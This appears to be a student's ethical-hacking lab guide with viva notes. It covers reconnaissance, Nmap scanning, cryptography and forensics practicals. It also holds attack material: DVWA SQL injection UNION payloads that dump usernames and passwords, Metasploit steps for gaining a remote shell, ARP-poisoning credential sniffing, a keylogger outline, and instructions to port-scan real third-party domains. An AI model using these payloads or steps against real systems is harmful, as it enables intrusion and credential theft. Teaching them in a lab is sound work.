@@ -1,0 +1,297 @@
+Domain 1: Network Tracing & Passive Reconnaissance (Practicals 1, 3, 5, 10)
+This phase relies on public databases and ICMP/TTL manipulation to map infrastructure without direct, aggressive interaction.
+Practical 1 & 10: Traceroute Execution
+Objective: Find the number of hops to www.prestashop.com (Prac 1) and www.google.com (Prac 10).
+Method (Windows): Open Command Prompt and type tracert www.prestashop.com or tracert www.google.com.
+Method (Linux): Open Terminal and type traceroute www.prestashop.com.
+Analysis: The output displays a numbered list. The highest number printed before reaching the final destination IP is the exact number of hops (routers) your packets traversed.
+
+Practical 3: General Domain Reconnaissance
+Objective: Extract Domain name, URL, Registrant, Email, and IP.
+Method: 1.  Execute nslookup [target.com] in your terminal to resolve the target's IP address.
+2.  Open a browser and navigate to whois.domaintools.com or use the CLI command whois [target.com].
+3.  Extract the requested fields directly from the WHOIS output table. Note: Emails may be redacted due to GDPR privacy protections.
+
+Practical 5: Specific Reconnaissance on GoDaddy.com
+Objective: Find the owner, geographic location, and IP block owner of godaddy.com.
+Method:
+Run nslookup godaddy.com to get its IP address.
+Run whois godaddy.com. The Registrant Organization will show the owner (GoDaddy, LLC).
+The WHOIS record will display the Registrant State/Province and Country (usually Tempe, Arizona, US).
+Run whois [IP_Address]. This queries the ARIN/RIPE database to reveal the AS (Autonomous System) and the corporate owner of that specific IP block.
+Domain 2: Active Network Scanning (Practicals 2, 9, 11, 12)
+This phase utilizes Nmap and Ping to actively probe target networks.
+Engineering Note for Practicals 2 and 11: Enterprise targets like Google and ESPN use global Content Delivery Networks (CDNs). You cannot discover "all active machines" in their internal network from the outside, as firewalls block this. You can only map the edge nodes presented to your region.
+
+Practical 2: Reconnaissance on www.google.com
+Network Range: Run whois google.com and look for the CIDR notation (e.g., 142.250.0.0/15).
+Active Machines (Conceptual): Run nmap -sn 142.250.192.0/24 to ping-sweep a subnet of Google's public range.
+Open Ports: Run nmap -p- www.google.com (scans all 65,535 ports).
+Services on Ports: Run nmap -sV www.google.com (grabs the service banners, e.g., HTTP, HTTPS).
+Server Name: Run nslookup www.google.com or analyze the reverse DNS (rDNS) pointer in the Nmap output.
+
+Practical 9: General Network Scanning Routine
+Perform Network Scan & Find Active Machines: Run nmap -sn [Your_Local_Subnet/24]. The output will state "N hosts up", identifying active machines.
+Ping Command: Run ping -c 4 [Target_IP] to test basic ICMP connectivity.
+Find Hops: Run traceroute [Target_IP].
+
+Practical 11: ESPN Network Scanning
+Ping for Packets: Run ping www.espn.com. Let it run for a few seconds, then press Ctrl+C. The output summary will explicitly state: X packets transmitted, Y received, Z% packet loss.
+Active Edge Machines: Run nmap -sn www.espn.com to see which CDN IPs resolve and respond in your region.
+
+Practical 12: OS and Open Port Scanning
+Method: Execute sudo nmap -O -sV [Target_IP].
+Analysis: The -O flag forces TCP/IP fingerprinting to guess the Operating System. The -sV flag probes the open ports to display the exact software versions running on them.
+Domain 3: Applied Cryptography (Practicals 4, 7)
+
+Practical 4 & 7: Encryption and Decryption using CrypTool 1
+Initialization: Open CrypTool 1. Go to File > New and type a sample password (e.g., Admin@123).
+RC4 Encryption (Prac 7): Navigate to Encrypt/Decrypt > Symmetric (modern) > RC4.
+Key Entry: Enter a hexadecimal key (e.g., 00 00 00 00 00). Click Encrypt. A new window showing the ciphertext will appear.
+Decryption: With the ciphertext window active, navigate back to Encrypt/Decrypt > Symmetric (modern) > RC4. Enter the exact same key used in Step 3. Click Decrypt to restore the original password.
+Domain 4: Digital Forensics (Practical 6)
+
+Practical 6: Email Header Tracing
+Objective: Extract geographic and routing metadata from an email.
+Method:
+Open an email in Gmail or Outlook. Select "Show Original" or "View Message Details" to view the raw email header.
+Copy the entire block of raw text.
+Open a visual tracing tool like eToolz (if installed locally) or an online tool like MXToolbox Email Header Analyzer.
+Paste the header. The tool will parse the Received: fields bottom-to-top to extract:
+From/To: The stated sender and recipient.
+Date/Subject: Time of dispatch and subject line.
+Sender IP: The original IP address that injected the email into the first SMTP server.
+Hop Route & Location Map: A visual breakdown of every server the email bounced through, cross-referenced with GeoIP databases to map the physical locations.
+Domain 5: System Exploitation & Local Auditing (Practicals 8, 13)
+
+Practical 8: Penetration Testing Workflow
+System and Network Scan: Run nmap -sS -O [Target_IP] to map the target's open ports and OS.
+Enumerate User Accounts: If SMB (Port 445) is open, run enum4linux -U [Target_IP] or nmap --script smb-enum-users.nse -p 445 [Target_IP] to extract local usernames.
+Execute Remote Penetration: Launch msfconsole. Use an exploit matching the discovered vulnerability (e.g., use exploit/windows/smb/ms08_067_netapi), set the RHOSTS, set the payload, and type exploit to gain a shell.
+Gather Local Network Info: Once inside the target (or on your own network), run arp -a to view the ARP cache and see all actively communicating local machines.
+
+Practical 13: Local Port and Process Auditing
+Objective: Map active ports to their specific software processes.
+Method (Windows): Open Command Prompt as Administrator and run:
+DOS
+netstat -bano
+Analysis: This command fulfills every requirement of the practical:
+-n: Displays Local/Remote Addresses and Ports numerically.
+-o: Displays the Process ID (PID).
+-a: Shows all active TCP and UDP connections (Protocol).
+-b: Displays the actual executable Process Name involved in creating the connection.
+Alternative GUI Method: Use Microsoft Sysinternals TCPView, which maps all these fields dynamically in real-time.
+
+Domain 1: Advanced Network Scanning & Topography (Practicals 14, 16, 18, 19, 22, 30)
+This domain focuses on mapping the network surface area, analyzing packet filters (firewalls), and documenting infrastructure.
+A. Comprehensive Port & Topology Scan (Practicals 14, 18, 30)
+Scan for TCP/UDP and OS: Open your terminal and execute:
+Bash
+sudo nmap -sS -sU -p 1-1000 -O --traceroute -oN scan_results.txt [Target_IP]
+-sS: Stealth TCP SYN scan.
+-sU: UDP scan.
+-O: OS Fingerprinting.
+--traceroute: Maps the host topology and routing path.
+-oN: Records and saves the output to a text file.
+Determine Packet Filters (Prac 14c): Run an ACK scan to map firewall rules:
+Bash
+sudo nmap -sA [Target_IP]
+(If it returns "unfiltered," the port is accessible but no application is listening. If "filtered," a stateful firewall is actively dropping your probes).
+Compare Results: Open scan_results.txt to review open vs. filtered ports and identify suspicious anomalies (e.g., an unexpected port like 4444 open, indicating a potential backdoor).
+B. Zenmap GUI Scans (Practical 16)
+Launch Zenmap (the graphical interface for Nmap). Enter your Target IP.
+From the Profile drop-down, execute the required scans:
+Intense Scan: Automatically runs -T4 -A -v (Aggressive timing, OS detection, versioning, script scanning, and traceroute).
+Xmas Scan: Type nmap -sX [Target_IP]. This sets the FIN, PSH, and URG flags simultaneously, "lighting the packet up like a Christmas tree" to bypass older stateless firewalls.
+Null Scan: Type nmap -sN [Target_IP]. Sends a packet with zero flags set.
+ACK Scan: Type nmap -sA [Target_IP].
+C. IP Scanning and CurrPorts Auditing (Practicals 19, 22)
+Continuous Ping: Open Command Prompt and type ping -t www.google.com.
+IP Scanner: Open Advanced IP Scanner or Angry IP Scanner. Enter your local subnet (e.g., 192.168.1.1 - 192.168.1.254) and click Scan to find active MAC addresses and hostnames.
+CurrPorts HTML Export: * Run CurrPorts (by NirSoft) as Administrator. This tool maps local active ports to their specific processes.
+Select the processes you want to document, click View, and select HTML Report - All Items. Save the generated HTML file.
+Domain 2: System Enumeration (Practicals 20, 23, 25)
+Enumeration is the systematic extraction of internal system data (users, shares, policies) from an open port discovered during the scanning phase.
+A. SMB/NetBIOS Enumeration
+If your Nmap scan (Prac 23) reveals Port 139 or 445 (SMB) is open, you can extract the required data using enum4linux.
+Open Kali Linux terminal.
+Execute the master enumeration command:
+
+Bash
+enum4linux -a [Target_IP]
+Analysis: The -a (all) flag automates the extraction of:
+Usernames and Groups: Dumps local user accounts.
+Machine Names & OS: Extracts NetBIOS names and system architecture.
+List of Shares: Maps available network drives (e.g., IPC$, ADMIN$, C$).
+Policies: Extracts password complexity requirements and lockout policies.
+Domain 3: Vulnerability Assessment & Exploitation (Practicals 15, 21, 33)
+This bridges the gap between finding a weakness and weaponizing it.
+
+A. Vulnerability Auditing & Remediation (Practical 15)
+Scan & Audit: Launch an enterprise vulnerability scanner like Nessus or OpenVAS. Input the target network range and run a basic network audit.
+Identify Vulnerabilities: Review the generated dashboard. It will highlight vulnerable ports and assign a CVSS (Common Vulnerability Scoring System) severity score to each flaw (e.g., "Critical: MS08-067 Vulnerability on Port 445").
+Remedial Action: The remediation step requires logging into the vulnerable server and applying the specific software patch (e.g., Windows Update) or disabling the vulnerable service, then rescanning to confirm the fix.
+B. Exploitation Tests via Kali Linux (Practicals 21, 33)
+Launch the Metasploit Framework: msfconsole.
+Search for the vulnerability found in step A: search [vulnerability_name].
+Select the exploit: use exploit/[path_to_exploit].
+Configure the payload: set PAYLOAD [payload_type].
+Set target parameters: set RHOSTS [Target_IP].
+Launch the attack: exploit. This yields a remote shell.
+Domain 4: Advanced Web Exploitation - SQL Injection (Practicals 31, 32)
+his requires manually mapping and extracting a backend database structure using the Damn Vulnerable Web App (DVWA).
+A. Manual SQLi Extraction Workflow
+Log into DVWA. Navigate to DVWA Security and set the level to Low.
+Navigate to the SQL Injection module. You will see a "User ID" input box.
+Extract Database Name: Inject a UNION statement to merge your query with the application's query.
+SQL
+ UNION SELECT 1, database() #
+Extract Hostname:
+SQL
+' UNION SELECT 1, @@hostname #
+List Table Names: Query the internal information schema.
+SQL
+' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() #
+Extract Usernames and Passwords: Now that you know the table is named users, dump its contents.
+SQL
+' UNION SELECT user, password FROM users #
+Domain 5: Applied Cryptography & Forensics (Practicals 26, 27, 28, 29)
+A. Password Cracking Verification (Practicals 26, 28)
+Cryptool (RC4 Verification): As covered previously, use CrypTool 1 -> Symmetric -> RC4 to encrypt a password. Note the hexadecimal output.
+Dictionary Attack (Cain and Abel):
+Load the RC4/NTLM hashes into the Cracker tab in Cain & Abel.
+Right-click -> Dictionary Attack -> Select your rockyou.txt wordlist.
+Click Start. The tool computes hashes for every word in the dictionary until it finds the mathematical collision that matches your target password.
+B. Wireshark Sniffing (Practicals 27, 29)
+Launch Wireshark and select your active network interface.
+Capture live traffic while simulating an HTTP login on your target lab application.
+Stop the capture. Type http.request.method == "POST" in the display filter to isolate data submissions.
+Right-click the POST packet -> Follow -> TCP Stream to view the raw, unencrypted traffic payload (including usernames and passwords).
+Domain 6: Payload Engineering (Practicals 17, 24)
+A. Python Keylogger
+As outlined in the first section of our interaction, creating a keylogger requires the pynput library.
+Install the dependency: pip install pynput
+Write the script using pynput.keyboard.Listener to intercept keystrokes at the application layer.
+Use the logging module to continuously append the intercepted keystrokes into a local hidden .txt file on the system.  
+
+Advanced TCP Manipulation & Scanning (Task 1)
+This practical requires manipulating the TCP header flags to map open ports and evade basic stateless firewalls.
+Practical Execution via Nmap:
+Open your Kali Linux terminal and execute the following scans against your target IP:
+•	1. SYN Scan (Stealth Scan):
+o	Command: sudo nmap -sS [Target_IP]
+o	Mechanism: Sends a SYN packet. If the port is open, the target replies with SYN/ACK. The attacker immediately tears down the connection with an RST (Reset) packet. It is "stealthy" because the incomplete 3-way handshake is rarely logged by application-level services.
+•	2. FIN Scan:
+o	Command: sudo nmap -sF [Target_IP]
+o	Mechanism: Sends a packet with only the FIN (Finish) flag set. According to TCP RFC 793, closed ports must reply with an RST packet, while open ports must ignore the packet entirely.
+•	3. NULL Scan:
+o	Command: sudo nmap -sN [Target_IP]
+o	Mechanism: Sends a packet with absolutely zero flags set. Similar to the FIN scan, closed ports respond with RST, and open ports drop the packet silently.
+•	4. XMAS Scan:
+o	Command: sudo nmap -sX [Target_IP]
+o	Mechanism: Sets the FIN, PSH, and URG flags simultaneously. This anomalous packet forces closed ports to reply with RST and open ports to ignore it.
+Analytical Characteristics: FIN, NULL, and XMAS scans are highly effective against older Unix/Linux systems and stateless firewalls. However, modern Windows operating systems do not strictly follow RFC 793 and will reply with an RST regardless of whether the port is open or closed, making these scans less reliable in a Windows-heavy environment.
+________________________________________
+Domain 2: Infrastructure Topography (Task 3)
+This section maps the physical and logical layout of a network segment using ICMP and TTL (Time-to-Live) manipulation.
+Practical Execution:
+•	A. Perform Network Scan & Find Active Machines:
+o	Command: nmap -sn 192.168.1.0/24 (Replace with your local subnet).
+o	Analysis: The -sn flag (formerly -sP) performs a Ping Sweep, disabling port scanning to rapidly identify which host IPs are currently online and responding to ARP or ICMP requests.
+•	B. Perform Ping Command:
+o	Command: ping -c 4 [Target_IP]
+o	Analysis: Tests point-to-point network layer connectivity and measures latency/packet loss using ICMP Echo Requests.
+•	C. Find Number of Hops:
+o	Command: traceroute [Target_Domain_or_IP] (Use tracert on Windows).
+o	Analysis: By incrementally increasing the TTL value of packets, this command forces each router along the path to drop the packet and send an ICMP "Time Exceeded" message back, revealing the exact sequence and number of routing hops.
+________________________________________
+Domain 3: Passive Reconnaissance (Tasks 4 & 6)
+This phase relies on interrogating public registry databases to map a target's administrative and technical footprint without touching their servers directly.
+Practical Execution: Google.com WHOIS Analysis
+To extract the required data for google.com, you can utilize the command-line WHOIS utility.
+1.	Execute the Query: whois -v "www.google.com".
+2.	Data Extraction:
+o	Domain Name: google.com.
+o	URL: http://www.markmonitor.com (This is the Registrar URL managing the domain).
+o	Registrant Name/Organization: Google LLC.
+o	Email Address: Standard WHOIS privacy often masks direct emails, directing users to a web form for contact. However, the Registrar Abuse Contact Email is visible as abusecomplaints@markmonitor.com.
+o	Server Name (Nameservers): The infrastructure relies on ns1.google.com through ns4.google.com.
+Practical Execution: Additional Active Probing (Task 6a, 6c, 6d)
+•	Network Range (IP Block): First, run nslookup google.com to find a public edge IP (e.g., 142.250.192.x). Then, run whois [That_IP] to query the ARIN database, which will reveal the full CIDR block allocated to Google (e.g., 142.250.0.0/15).
+•	Discover Open Ports & Services: Run nmap -sV -p 80,443 google.com. This will uncover open access points and identify the services running on them (HTTP/HTTPS). Note: Enterprise networks block aggressive scanning; you will only see edge services.
+________________________________________
+Domain 4: Layer 2 Exploitation & Packet Analysis (Tasks 2 & 5)
+This combined practical demonstrates how an attacker positions themselves logically on a network to intercept and extract unencrypted credentials.
+Step 1: The ARP Poisoning Attack (Task 5)
+The objective is to execute a Man-in-the-Middle (MITM) attack to capture an email password. This only works if the target is using legacy, unencrypted mail protocols (POP3 on port 110, IMAP on port 143, or SMTP on port 25 without TLS).
+1.	Tool Selection: Launch Ettercap (Graphical) or use Cain and Abel on Windows.
+2.	Configure Target Matrix: Scan the local subnet for hosts. Add the Target Machine (the victim) as Target 1, and the Default Gateway (the router) as Target 2.
+3.	Execute Poisoning: Activate the ARP Poisoning plugin. Your machine is now forging ARP replies, routing all the victim's traffic through your network interface card before it reaches the router.
+Step 2: Wireshark Packet Analysis (Task 2)
+1.	Capture Traffic: Launch Wireshark, select your active network interface, and start capturing packets.
+2.	Trigger the Exploit: On the victim machine, attempt to log into the vulnerable email client (e.g., a legacy mail app checking a local lab server).
+3.	Analyze and Extract:
+o	Stop the Wireshark capture.
+o	Apply a display filter for the vulnerable protocol: type pop or imap in the filter bar and hit Enter.
+o	Look for packets labeled USER and PASS (for POP3) or LOGIN (for IMAP).
+o	Right-click the relevant packet and select Follow -> TCP Stream. The pop-up window will display the entire conversation in cleartext, explicitly revealing the email account's username and password.
+
+Domain 1: Enterprise Network Probing (www.sports.com)
+The objective is to scan an external domain to identify active machines and determine packet transmission statistics.
+Engineering Context: When scanning a massive enterprise target like a global sports media company, it is critical to understand that you cannot discover all their internal active machines from the outside. Enterprise firewalls and Content Delivery Networks (CDNs) like Cloudflare or Akamai shield the internal infrastructure. You will only be mapping their public-facing edge nodes.
+Step 1: Finding the Number of Packets Sent (Ping Analysis)
+1.	Open your terminal or Command Prompt.
+2.	Execute the standard ICMP ping command:
+Bash
+ping www.sports.com
+3.	Allow it to run for a few seconds (usually 4 packets on Windows), or manually stop it on Linux using Ctrl+C.
+4.	Analysis: Review the statistical summary at the bottom of the output. It will explicitly list your findings:
+o	Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)
+o	This confirms the number of packets sent and verifies Layer 3 routing connectivity.
+Step 2: Finding Active Edge Machines (Nmap)
+1.	To identify the active IP addresses resolving to this domain in your geographic region, execute a ping sweep:
+Bash
+nmap -sn www.sports.com
+2.	Analysis: The output will return the active CDN nodes or load balancers currently handling traffic for that domain (e.g., Nmap scan report for www.sports.com (104.18.2.100)). It will state "Host is up," confirming the machine is active.
+________________________________________
+Domain 3: Advanced Nmap Scanning via Zenmap
+Zenmap is the official graphical user interface (GUI) for Nmap. This practical requires executing specific pre-configured scan profiles and manipulating TCP headers.
+Step 1: Initialization
+1.	Launch the Zenmap application (ensure you run it with Administrator/Root privileges to allow raw packet manipulation).
+2.	Enter your Target IP address in the Target field.
+Step 2: Executing the Scans Select the following options from the Profile drop-down menu and click Scan:
+•	A. Intense Scan:
+o	Underlying Command: nmap -T4 -A -v [Target_IP]
+o	Mechanism: This is a highly aggressive, noisy scan. It utilizes fast timing (-T4), enables OS detection, service versioning, script scanning, and traceroute (-A), and provides verbose real-time output (-v). It is designed to extract maximum information in minimum time.
+•	B. Xmas Scan:
+o	Underlying Command: nmap -sX [Target_IP]
+o	Mechanism: This scan manipulates the TCP header by setting the FIN, PSH, and URG flags simultaneously (lighting the packet up like a Christmas tree).
+o	Analysis: According to the TCP RFC, if a port is closed, the target must reply with an RST (Reset) packet. If the port is open, the target must ignore the anomalous packet silently.
+•	C. Null Scan:
+o	Underlying Command: nmap -sN [Target_IP]
+o	Mechanism: This scan sends a TCP packet with absolutely zero flags set.
+o	Analysis: Similar to the Xmas scan, closed ports reply with an RST, while open or firewalled ports drop the packet silently.
+________________________________________
+Domain 3: Local Network Auditing (Ping & IP Scanner)
+The objective here is to map out your local subnet to identify all connected physical devices and their network interfaces.
+Step 1: The Ping Verification
+1.	Determine your own IP address and subnet (e.g., using ipconfig or ifconfig). Assume your IP is 192.168.1.15.
+2.	Ping the default gateway (your router) to ensure local connectivity: ping 192.168.1.1.
+Step 2: IP Scanner Execution
+1.	Launch a graphical network scanner like Advanced IP Scanner (Windows) or Angry IP Scanner.
+2.	Input your local network range (e.g., 192.168.1.1 - 192.168.1.254).
+3.	Click Scan. The software will rapidly dispatch ICMP Echo Requests and ARP broadcasts across the entire subnet.
+Step 3: Listing Your Findings Once the scan completes, you must document the extracted data table. Your findings list should include:
+•	Status: (Online/Offline)
+•	Name (Hostname): (e.g., DESKTOP-PC1, Android-Phone, HP-Printer)
+•	IP Address: (e.g., 192.168.1.45)
+•	Manufacturer / MAC Address: The hardware identifier and vendor of the Network Interface Card (e.g., B4:B6:76:xx:xx:xx / Intel Corporate).
+________________________________________
+IV. Viva Preparation: Strategic Defenses
+To demonstrate a systems-level understanding during your evaluation, consider how these protocols interact at the operating system level.
+Q1: You ran an Xmas Scan and a Null Scan against a target, but every single port showed up as "Closed." However, an Intense Scan showed Port 80 is open. Why did the Xmas/Null scans fail?
+•	Answer: Xmas and Null scans rely on a strict interpretation of the TCP RFC 793 to determine port states. While older Unix/Linux systems follow this perfectly, Microsoft Windows operating systems do not. A Windows machine will typically respond with an RST packet to any malformed flag combination, regardless of whether the port is open or closed, rendering these specific stealth scans ineffective against Windows environments.
+Q2: During your IP Scanner practical, how does the scanner determine the "Manufacturer" of a device just by scanning the network?
+•	Answer: It uses the MAC (Media Access Control) address discovered via the ARP broadcast. The first three bytes (24 bits) of a MAC address are the OUI (Organizationally Unique Identifier). The scanner checks this OUI against a public IEEE database to instantly identify if the hardware belongs to Apple, Cisco, Intel, or another manufacturer.
+
+
